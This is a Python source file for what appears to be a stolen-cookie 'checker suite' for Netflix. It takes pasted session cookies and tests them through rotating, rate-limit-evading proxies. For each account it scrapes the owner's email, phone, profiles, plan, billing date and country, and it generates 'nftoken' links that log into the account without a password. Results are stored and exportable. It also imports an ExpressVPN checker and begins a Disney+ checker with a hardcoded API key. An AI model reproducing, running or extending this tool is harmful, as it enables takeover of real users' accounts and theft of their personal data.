import csv
import hmac
import http.server
import io
import json
import logging
import os
import random
import re
import socketserver
import sqlite3
import threading
import time
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

from expressvpn_checker import check_expressvpn_account

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PORT = int(os.environ.get("PORT", 8080))
PROXIES_FILE = os.path.join(BASE_DIR, "netflix_proxies.txt")
DB_FILE = os.path.join(BASE_DIR, "netflix_suite.db")
CONFIG_FILE = os.path.join(BASE_DIR, "suite_config.json")
LOG_FILE = os.path.join(BASE_DIR, "suite.log")
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

# Setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    encoding='utf-8'
)

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")

COUNTRY_CODE_NAMES = {
    'AR': 'Argentina', 'AU': 'Australia', 'BR': 'Brazil', 'CA': 'Canada',
    'DE': 'Germany', 'ES': 'Spain', 'FR': 'France', 'GB': 'United Kingdom',
    'ID': 'Indonesia', 'IN': 'India', 'IT': 'Italy', 'JP': 'Japan',
    'KR': 'South Korea', 'MY': 'Malaysia', 'MX': 'Mexico', 'NL': 'Netherlands',
    'PH': 'Philippines', 'SG': 'Singapore', 'TH': 'Thailand', 'TR': 'Turkey',
    'US': 'United States', 'VN': 'Vietnam',
}

def extract_cookie_values(text):
    cookie_dict = {}
    if not text:
        return cookie_dict

    text = str(text).strip()

    json_match = re.search(r'\[\s*\{[\s\S]*?\}\s*\]', text)
    if json_match:
        try:
            parsed = json.loads(json_match.group(0))
            if isinstance(parsed, list):
                for c in parsed:
                    if isinstance(c, dict):
                        n, v = c.get("name"), c.get("value")
                        if n in COOKIE_KEYS and isinstance(v, str):
                            cookie_dict[n] = urllib.parse.unquote(v) if "%" in v else v
        except Exception:
            pass

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#") or line.startswith("═") or line.startswith("█") or line.startswith("–"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookie_dict[parts[5]] = parts[6]

    try:
        data = json.loads(text)
    except Exception:
        data = None

    if isinstance(data, list):
        for c in data:
            if isinstance(c, dict):
                n, v = c.get("name"), c.get("value")
                if n in COOKIE_KEYS and isinstance(v, str):
                    cookie_dict[n] = urllib.parse.unquote(v) if "%" in v else v
    elif isinstance(data, dict):
        for k in COOKIE_KEYS:
            v = data.get(k)
            if isinstance(v, str):
                cookie_dict[k] = urllib.parse.unquote(v) if "%" in v else v

    for k in COOKIE_KEYS:
        if k not in cookie_dict:
            m = re.search(rf"(?:•\s*Cookie:\s*|[;\s]|^){re.escape(k)}=([^;,\r\n\s]+)", text)
            if m:
                v = m.group(1)
                cookie_dict[k] = urllib.parse.unquote(v) if "%" in v else v

    for k in list(cookie_dict.keys()):
        if isinstance(cookie_dict[k], str):
            cookie_dict[k] = cookie_dict[k].strip().rstrip('.')

    return cookie_dict

def get_cookie_fingerprint(text):
    if not text:
        return ""
    ck = extract_cookie_values(text)
    nid = ck.get("NetflixId", "")
    if nid:
        ct_m = re.search(r'ct=([^&]+)', nid)
        if ct_m:
            return f"ct:{ct_m.group(1)}"
        return f"nid:{nid.strip()}"
    cleaned = re.sub(r'\s+', '', str(text).strip())
    return f"raw:{cleaned[:120]}"

db_lock = threading.Lock()
healthy_proxies = []
all_tested_proxies = []
proxy_lock = threading.Lock()
server_start_time = time.time()

def get_config():
    if not os.path.exists(CONFIG_FILE):
        return {"pin": ""}
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {"pin": ""}

def save_config(cfg):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)

def get_db():
    conn = sqlite3.connect(DB_FILE, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL;")
    return conn

def init_db():
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                created_at TEXT,
                type TEXT,
                status TEXT,
                plan TEXT,
                billing TEXT,
                country TEXT,
                route TEXT,
                token_url TEXT,
                raw_cookie TEXT,
                cookie_key TEXT
            )
        ''')
        c.execute("PRAGMA table_info(history)")
        cols = [r[1] for r in c.fetchall()]
        if "cookie_key" not in cols:
            c.execute("ALTER TABLE history ADD COLUMN cookie_key TEXT")
        if "email" not in cols:
            c.execute("ALTER TABLE history ADD COLUMN email TEXT DEFAULT ''")
        c.execute("CREATE INDEX IF NOT EXISTS idx_history_cookie_key ON history(cookie_key)")
        conn.commit()
        conn.close()

def save_history(entry_type, status, plan='', billing='', country='', route='', token_url='', raw_cookie='', email=''):
    with db_lock:
        try:
            conn = get_db()
            c = conn.cursor()
            key = get_cookie_fingerprint(raw_cookie)
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            existing = None
            if key:
                c.execute('SELECT id, plan, billing, country, token_url FROM history WHERE cookie_key = ? ORDER BY id DESC LIMIT 1', (key,))
                existing = c.fetchone()
            if not existing and raw_cookie:
                c.execute('SELECT id, plan, billing, country, token_url FROM history WHERE raw_cookie = ? ORDER BY id DESC LIMIT 1', (raw_cookie,))
                existing = c.fetchone()

            if existing:
                existing_id, ex_plan, ex_billing, ex_country, ex_token = existing
                final_plan = plan if plan else ex_plan
                final_billing = billing if billing else (ex_billing if status != 'DEAD' else '')
                final_country = country if country else ex_country
                final_token = token_url if token_url else (ex_token if status in ('LIVE', 'HOLD', 'FREE') else '')

                c.execute('''
                    UPDATE history
                    SET created_at = ?,
                        type = ?,
                        status = ?,
                        plan = ?,
                        billing = ?,
                        country = ?,
                        route = ?,
                        token_url = ?,
                        raw_cookie = ?,
                        cookie_key = ?,
                        email = ?
                    WHERE id = ?
                ''', (
                    now, entry_type, status, final_plan, final_billing,
                    final_country, route, final_token, raw_cookie, key, email,
                    existing_id
                ))
                if key:
                    c.execute('DELETE FROM history WHERE cookie_key = ? AND id != ?', (key, existing_id))
                logging.info(f"Update history [ID {existing_id}]: [{entry_type}] {status} - Plan: {final_plan} - Country: {final_country}")
            else:
                c.execute('''
                    INSERT INTO history (created_at, type, status, plan, billing, country, route, token_url, raw_cookie, cookie_key, email)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    now, entry_type, status, plan, billing, country,
                    route, token_url, raw_cookie, key, email
                ))
                logging.info(f"Save history: [{entry_type}] {status} - Plan: {plan} - Country: {country}")

            conn.commit()
            conn.close()
        except Exception as e:
            logging.error(f"Error saving history: {e}")

def get_history(limit=50, offset=0, search='', status='', plan='', entry_type=''):
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie, email FROM history WHERE 1=1'
        params = []

        if search:
            query += ' AND (country LIKE ? OR billing LIKE ? OR plan LIKE ? OR raw_cookie LIKE ? OR email LIKE ?)'
            params.extend([f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%'])
        if status:
            query += ' AND status = ?'
            params.append(status)
        if entry_type:
            query += ' AND type = ?'
            params.append(entry_type)
        if plan:
            p_upper = plan.upper()
            if p_upper in ('PREMIUM', '4K'):
                query += ' AND (plan LIKE "%4K%" OR plan LIKE "%ULTRA%" OR plan LIKE "%PREMIUM%")'
            elif p_upper == 'STANDARD':
                query += ' AND (plan LIKE "%STANDARD%" OR plan LIKE "%STANDAR%")'
            elif p_upper == 'BASIC':
                query += ' AND (plan LIKE "%BASIC%" OR plan LIKE "%DASAR%")'
            elif p_upper == 'MOBILE':
                query += ' AND (plan LIKE "%MOBILE%" OR plan LIKE "%PONSEL%")'
            else:
                query += ' AND plan LIKE ?'
                params.append(f'%{plan}%')

        # Count total
        count_query = 'SELECT COUNT(*) FROM (' + query + ')'
        c.execute(count_query, params)
        total = c.fetchone()[0]

        query += ' ORDER BY id DESC LIMIT ? OFFSET ?'
        params.extend([limit, offset])

        c.execute(query, params)
        rows = c.fetchall()
        conn.close()

        items = [
            {
                "id": r[0], "created_at": r[1], "type": r[2], "status": r[3],
                "plan": r[4], "billing": r[5], "country": r[6], "route": r[7],
                "token_url": r[8], "raw_cookie": r[9], "email": r[10] or ""
            }
            for r in rows
        ]
        return {"total": total, "items": items}

def export_history_csv(search='', status='', plan=''):
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie FROM history WHERE 1=1'
        params = []
        if search:
            query += ' AND (country LIKE ? OR billing LIKE ? OR plan LIKE ? OR raw_cookie LIKE ?)'
            params.extend([f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%'])
        if status:
            query += ' AND status = ?'
            params.append(status)
        if plan:
            p_upper = plan.upper()
            if p_upper in ('PREMIUM', '4K'):
                query += ' AND (plan LIKE "%4K%" OR plan LIKE "%ULTRA%" OR plan LIKE "%PREMIUM%")'
            elif p_upper == 'STANDARD':
                query += ' AND (plan LIKE "%STANDARD%" OR plan LIKE "%STANDAR%")'
            elif p_upper == 'BASIC':
                query += ' AND (plan LIKE "%BASIC%" OR plan LIKE "%DASAR%")'
            elif p_upper == 'MOBILE':
                query += ' AND (plan LIKE "%MOBILE%" OR plan LIKE "%PONSEL%")'
            else:
                query += ' AND plan LIKE ?'
                params.append(f'%{plan}%')
        query += ' ORDER BY id DESC'
        c.execute(query, params)
        rows = c.fetchall()
        conn.close()

        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(["ID", "Waktu", "Tipe", "Status", "Plan", "Billing", "Negara", "Route", "Token URL", "Raw Cookie"])
        for r in rows:
            safe_row = []
            for cell in r:
                s = str(cell) if cell is not None else ""
                if s and s[0] in ("=", "+", "-", "@", "\t", "\r"):
                    s = "'" + s
                safe_row.append(s)
            writer.writerow(safe_row)
        return output.getvalue()

def get_analytics():
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT status, COUNT(*) FROM history GROUP BY status')
        status_counts = dict(c.fetchall())
        c.execute('SELECT country, COUNT(*) FROM history WHERE country != "" AND country != "Unknown" GROUP BY country ORDER BY COUNT(*) DESC LIMIT 8')
        country_counts = dict(c.fetchall())
        c.execute('SELECT plan, COUNT(*) FROM history WHERE (status = "LIVE" OR status = "HOLD") AND plan != "" GROUP BY plan ORDER BY COUNT(*) DESC LIMIT 6')
        plan_counts = dict(c.fetchall())
        conn.close()
        return {"status_counts": status_counts, "country_counts": country_counts, "plan_counts": plan_counts}

def clear_history(only_dead=False):
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        if only_dead:
            c.execute('DELETE FROM history WHERE status = "DEAD" OR status = "ERROR" OR status = "BAD"')
            logging.info("Deleted only DEAD/ERROR/BAD history records.")
        else:
            c.execute('DELETE FROM history')
            logging.info("History database cleared completely.")
        conn.commit()
        conn.close()

def parse_single_proxy(line):
    p = line.strip()
    if not p or p.startswith("#"):
        return None
    scheme = None
    if "://" in p:
        scheme, remainder = p.split("://", 1)
        scheme = scheme.lower()
    else:
        remainder = p

    # Default scheme is http if not specified
    actual_scheme = scheme or "http"

    # Format user:pass@ip:port
    if "@" in remainder:
        auth_part, netloc = remainder.split("@", 1)
        netloc_parts = netloc.split(":")
        raw = f"{netloc_parts[0]}:{netloc_parts[1]}"
        proxy = f"{actual_scheme}://{auth_part}@{netloc}"
        return {"raw": raw, "proxy": proxy, "line": p, "latency": 0, "status": "OK"}

    parts = remainder.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return {"raw": f"{ip}:{port}", "proxy": f"{actual_scheme}://{user}:{pwd}@{ip}:{port}", "line": p, "latency": 0, "status": "OK"}
    elif len(parts) == 2:
        ip, port = parts
        return {"raw": f"{ip}:{port}", "proxy": f"{actual_scheme}://{ip}:{port}", "line": p, "latency": 0, "status": "OK"}
    return None

def load_proxies():
    if not os.path.exists(PROXIES_FILE):
        return []
    res = []
    with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            item = parse_single_proxy(line)
            if item:
                # Default status unverified/initial
                item["status"] = "UNVERIFIED"
                res.append(item)
    return res

def check_proxy_health(p):
    t0 = time.time()
    candidates = [p["proxy"]]
    if p["proxy"].startswith("http://"):
        candidates.append("https://" + p["proxy"][7:])
    elif p["proxy"].startswith("https://"):
        candidates.append("http://" + p["proxy"][8:])
    elif p["proxy"].startswith("socks5://"):
        candidates.append("socks5h://" + p["proxy"][9:])
    elif p["proxy"].startswith("socks4://"):
        candidates.append("socks4a://" + p["proxy"][9:])

    for prx in candidates:
        try:
            proxies = {"http": prx, "https": prx}
            r = requests.get("https://www.netflix.com/favicon.ico", proxies=proxies, timeout=6, verify=False)
            if r.status_code in (200, 301, 302, 404):
                p["proxy"] = prx
                latency = int((time.time() - t0) * 1000)
                return True, latency
        except Exception:
            pass
    return False, 0

def proxy_health_worker():
    global healthy_proxies, all_tested_proxies
    while True:
        all_p = load_proxies()
        good = []
        import concurrent.futures
        def _bg_test(p):
            ok, lat = check_proxy_health(p)
            if ok:
                p["latency"] = lat
                p["status"] = "OK"
            else:
                p["latency"] = 0
                p["status"] = "FAIL"
            return p

        with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
            tested = list(ex.map(_bg_test, all_p))

        good = [p for p in tested if p["status"] == "OK"]
        with proxy_lock:
            all_tested_proxies = tested
            healthy_proxies = good
        time.sleep(300)

def test_all_proxies_now():
    global healthy_proxies, all_tested_proxies
    all_p = load_proxies()
    import concurrent.futures
    def _test_single(p):
        ok, lat = check_proxy_health(p)
        if ok:
            p["latency"] = lat
            p["status"] = "OK"
        else:
            p["latency"] = 0
            p["status"] = "FAIL"
        return p

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        tested = list(ex.map(_test_single, all_p))
    
    good = [p for p in tested if p["status"] == "OK"]
    with proxy_lock:
        all_tested_proxies = list(tested)
        healthy_proxies = good
    return tested

proxy_cooldown = {}
proxy_cooldown_lock = threading.Lock()

def mark_proxy_cooldown(proxy_url, duration=600):
    if not proxy_url:
        return
    with proxy_cooldown_lock:
        proxy_cooldown[proxy_url] = time.time() + duration

def get_random_proxy():
    global healthy_proxies
    now = time.time()
    with proxy_lock:
        pool = list(healthy_proxies) if healthy_proxies else load_proxies()
    with proxy_cooldown_lock:
        valid_pool = [p for p in pool if proxy_cooldown.get(p["proxy"], 0) <= now]
    if not valid_pool:
        valid_pool = pool
    if not valid_pool:
        return None, None, None
    choice = random.choice(valid_pool)
    lat_info = f" ({choice.get('latency', 0)}ms)" if choice.get("latency") else ""
    return {"http": choice["proxy"], "https": choice["proxy"]}, f"{choice['raw']}{lat_info}", choice["proxy"]

def normalize_country(code):
    if not code:
        return 'Unknown'
    c = str(code).strip().upper()
    if len(c) == 2 and c.isalpha():
        return f"{COUNTRY_CODE_NAMES.get(c, c)} ({c})"
    return c

def generate_nftoken(cookie_text, use_proxy=True):
    cookies = extract_cookie_values(cookie_text)
    nid = cookies.get("NetflixId")
    if not nid:
        raise ValueError("Cookie NetflixId tidak ditemukan.")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={nid}"

    # Auto-retry exponential backoff max 1 retry
    max_retries = 1
    last_err = None

    for attempt in range(max_retries + 1):
        if use_proxy:
            proxies, proxy_label, proxy_raw_url = get_random_proxy()
        else:
            proxies, proxy_label, proxy_raw_url = None, None, None
        route = f"Proxy ({proxy_label})" if proxy_label else "Direct"

        try:
            res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=18, verify=False)
            if res.status_code in (403, 429) and proxy_raw_url:
                mark_proxy_cooldown(proxy_raw_url, 600)
            res.raise_for_status()

            data = res.json()
            token_node = (
                (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
                or {}
            )
            token = token_node.get("token")
            expires = token_node.get("expires")
            if not token:
                raise ValueError("Netflix tidak mengembalikan token. Cookie mati/invalid.")

            exp_str = "Unknown"
            if isinstance(expires, (int, float)):
                ts = expires // 1000 if len(str(int(expires))) == 13 else expires
                exp_str = datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")

            token_url = f"https://netflix.com/?nftoken={token}"
            android_url = f"https://netflix.com/unsupported?nftoken={token}"
            tv_url = f"https://netflix.com/tv2?nftoken={token}"
            return token_url, android_url, tv_url, token, exp_str, route

        except Exception as e:
            last_err = e
            if attempt < max_retries:
                time.sleep(1.0 * (attempt + 1))
                continue

    raise last_err

def check_netflix_membership(cookie_text, use_proxy=True):
    cookies = extract_cookie_values(cookie_text)
    if "NetflixId" not in cookies:
        save_history("checker", "DEAD", raw_cookie=cookie_text)
        return {"live": False, "reason": "Cookie NetflixId tidak ditemukan."}

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.netflix.com/browse',
    }

    max_retries = 1
    last_err = None

    for attempt in range(max_retries + 1):
        if use_proxy:
            proxies, proxy_label, proxy_raw_url = get_random_proxy()
        else:
            proxies, proxy_label, proxy_raw_url = None, None, None
        route = f"Proxy ({proxy_label})" if proxy_label else "Direct"

        try:
            session = requests.Session()
            ck_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
            headers['Cookie'] = ck_header

            r = session.get(
                'https://www.netflix.com/account/membership',
                headers=headers,
                proxies=proxies,
                timeout=7,
                allow_redirects=True,
                verify=False
            )

            if r.status_code in (403, 429) and proxy_raw_url:
                mark_proxy_cooldown(proxy_raw_url, 600)

            if "login" in r.url.lower() or r.status_code in (401, 403) or 'data-uia="login-page"' in r.text:
                save_history("checker", "DEAD", route=route, raw_cookie=cookie_text)
                return {"live": False, "status": "DEAD", "reason": "Cookie Expired / Terlempar ke Login.", "route": route}

            html = r.text

            # 0. ON HOLD / MEMBERSHIP PAUSED DETECTION
            is_hold = False
            hold_reason = ""
            if re.search(r'"isPaused"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*true', html, re.I):
                is_hold = True
                hold_reason = "isPaused: true"
            elif re.search(r'"isPendingPause"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*true', html, re.I):
                is_hold = True
                hold_reason = "isPendingPause: true"
            elif re.search(r'"isUserOnHold"\s*:\s*true', html, re.I):
                is_hold = True
                hold_reason = "isUserOnHold: true"
            elif re.search(r'"serviceEndReason"\s*:\s*"SERVICE_END_(?:NO_MOP|MOP_FAILURE|PAYMENT_FAILURE|HOLD|PAUSED)"', html, re.I):
                is_hold = True
                hold_reason = "serviceEndReason: payment failure / hold"
            elif re.search(r'"(?:membershipStatus|accountStatus|membership_status)"\s*:\s*"(?:PAUSED|ON_HOLD|HOLD|SUSPENDED|PAYMENT_HOLD)"', html, re.I):
                is_hold = True
                hold_reason = "Status enum: HOLD/PAUSED"
            elif any(k in r.url.lower() for k in ('/simpleupdatepayment', '/updatepayment', '/orderstatus')):
                is_hold = True
                hold_reason = "Redirected to payment/hold URL"
            elif re.search(r'(?:Your\s+membership\s+is\s+paused|membership\s+is\s+paused|Keanggotaan\s+Anda\s+dijeda|Your\s+account\s+is\s+on\s+hold|membership\s+is\s+on\s+hold|account\s+is\s+on\s+hold|Akun\s+Anda\s+ditangguhkan|Please\s+add\s+your\s+payment\s+information|Tambahkan\s+informasi\s+pembayaran)', html, re.I):
                is_hold = True
                hold_reason = "UI Text: Membership Paused / Payment Required"
            elif re.search(r'data-uia="[^"]*(?:paused-membership|membership-paused|account-paused|membership-hold)[^"]*"', html, re.I):
                is_hold = True
                hold_reason = "data-uia: hold/paused marker"

            status = "HOLD" if is_hold else "LIVE"

            # 1. PLAN DETECTION
            plan_detected = 'Standard'
            # Check explicit localizedPlanName in reactContext / JSON state
            plan_json_match = re.search(r'"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', html)
            if plan_json_match:
                raw_p = plan_json_match.group(1).encode().decode('unicode_escape', errors='ignore')
                raw_p_lower = raw_p.lower()
                if 'iklan' in raw_p_lower or 'ads' in raw_p_lower:
                    plan_detected = 'Standard with Ads'
                elif 'ultra' in raw_p_lower or 'premium' in raw_p_lower or '4k' in raw_p_lower:
                    plan_detected = 'PREMIUM (ULTRA HD)'
                elif 'mobile' in raw_p_lower or 'ponsel' in raw_p_lower:
                    plan_detected = 'Mobile'
                elif 'dasar' in raw_p_lower or 'basic' in raw_p_lower:
                    plan_detected = 'Basic'
                else:
                    plan_detected = raw_p
            elif re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I) or re.search(r'\bpremium\b', html, re.I):
                plan_detected = 'PREMIUM (ULTRA HD)'
            else:
                plan_match = re.search(r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<', html)
                if plan_match:
                    p_txt = plan_match.group(1).strip()
                    p_txt_lower = p_txt.lower()
                    if 'iklan' in p_txt_lower or 'ads' in p_txt_lower:
                        plan_detected = 'Standard with Ads'
                    elif 'ultra' in p_txt_lower or 'premium' in p_txt_lower:
                        plan_detected = 'PREMIUM (ULTRA HD)'
                    elif 'mobile' in p_txt_lower or 'ponsel' in p_txt_lower:
                        plan_detected = 'Mobile'
                    elif 'dasar' in p_txt_lower or 'basic' in p_txt_lower:
                        plan_detected = 'Basic'
                    else:
                        plan_detected = p_txt

            # 2. EMAIL EXTRACTION
            email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html)
            if not email_match:
                email_match = re.search(r'"userEmail"\s*:\s*"([^"]+)"', html)
            if not email_match:
                email_match = re.search(r'data-uia="account-email"[^>]*>([^<]+)<', html)
            email = email_match.group(1).strip() if email_match else 'Account Valid'
            # Clean hex escapes if any
            if r'\x40' in email or r'\x' in email:
                try:
                    email = email.encode('utf-8').decode('unicode_escape')
                except Exception:
                    pass
                email = email.replace(r'\x40', '@')

            # 3. PHONE EXTRACTION
            phone_match = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html)
            if not phone_match:
                phone_match = re.search(r'data-uia="account-phone"[^>]*>([^<]+)<', html)
            phone = phone_match.group(1).strip() if phone_match else 'None'
            if r'\x20' in phone:
                phone = phone.replace(r'\x20', ' ')

            # 4. PROFILES EXTRACTION
            profiles = []
            # Method A: match GraphQL Profile objects
            for pm in re.finditer(r'Profile:\{.*?\"name\":\"([^\"]+)\"', html):
                p_name = pm.group(1).strip()
                if p_name and p_name not in profiles and not p_name.lower().startswith(('paket', 'plan', 'standard', 'premium', 'basic', 'mobile')):
                    profiles.append(p_name)

            # Method B: fallback to profileName or guid name
            if not profiles:
                for pm in re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html):
                    p_name = pm.group(1).encode().decode('unicode_escape', errors='ignore').strip()
                    if p_name and p_name not in profiles:
                        profiles.append(p_name)

            # 5. NEXT BILLING DATE
            date_match = re.search(r'"nextBillingDate"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', html)
            if date_match:
                billing = date_match.group(1).encode().decode('unicode_escape', errors='ignore').strip()
            else:
                date_dom_match = re.search(
                    r'data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
                    html, re.DOTALL | re.I
                )
                partner_match = re.search(r'Billed through\s+[^<\n"\']+', html, re.I)
                if date_dom_match:
                    billing = date_dom_match.group(1).strip()
                elif partner_match and not is_hold:
                    billing = partner_match.group(0).strip()
                else:
                    billing = 'Auto-renew active' if not is_hold else 'Membership Paused'

            if is_hold:
                if billing and billing != 'Auto-renew active' and 'HOLD' not in billing:
                    billing = f"{billing} (HOLD)"
                elif not billing or billing == 'Auto-renew active':
                    billing = "Membership Paused"

            # 6. MEMBER SINCE
            member_since_match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', html)
            member_since = member_since_match.group(1).strip() if member_since_match else 'Active'

            # 7. COUNTRY
            country_match = re.search(r'"(?:countryOfSignup|currentCountry)"\s*:\s*"([A-Za-z]{2})"', html)
            if not country_match:
                country_match = re.search(r'"(?:memberCountry|geoCountry)"\s*:\s*"([A-Za-z]{2})"', html)
            country = normalize_country(country_match.group(1)) if country_match else 'Unknown'

            # Try generating nftoken simultaneously if possible
            nftoken_data = None
            try:
                t_url, a_url, tv_url, tok, exp, _ = generate_nftoken(cookie_text, use_proxy=use_proxy)
                nftoken_data = {
                    "url": t_url,
                    "android_url": a_url,
                    "tv_url": tv_url,
                    "token": tok,
                    "expires": exp
                }
            except Exception:
                pass
            editor_cookies = [
                {"domain": ".netflix.com", "name": k, "path": "/", "secure": True, "httpOnly": True, "value": v}
                for k, v in cookies.items()
            ]

            tok_link = (nftoken_data.get("url") if nftoken_data else "")
            save_history("checker", status, plan=plan_detected, billing=billing, country=country, route=route, token_url=tok_link, raw_cookie=cookie_text)

            return {
                "live": not is_hold,
                "status": status,
                "is_hold": is_hold,
                "hold_reason": hold_reason,
                "email": email,
                "phone": phone,
                "plan": plan_detected,
                "billing": billing,
                "member_since": member_since,
                "profiles": profiles,
                "country": country,
                "cookies": editor_cookies,
                "token_data": nftoken_data,
                "route": route
            }
        except Exception as e:
            last_err = e
            if attempt < max_retries:
                time.sleep(1.0 * (attempt + 1))
                continue

    save_history("checker", "ERROR", route=route, raw_cookie=cookie_text)
    return {"live": False, "status": "ERROR", "reason": f"Request gagal setelah retry: {str(last_err)}", "route": route}

# ══════════════════════════════════════════════════════════════════════════════
# Disney+ Account Checker (BAMTech reverse-engineered flow)
# ══════════════════════════════════════════════════════════════════════════════

DISNEY_API_KEY = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
DISNEY_CLIENT_ID = "disney-svod-3d9324fc"
DISNEY_DEVICE_GQL = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
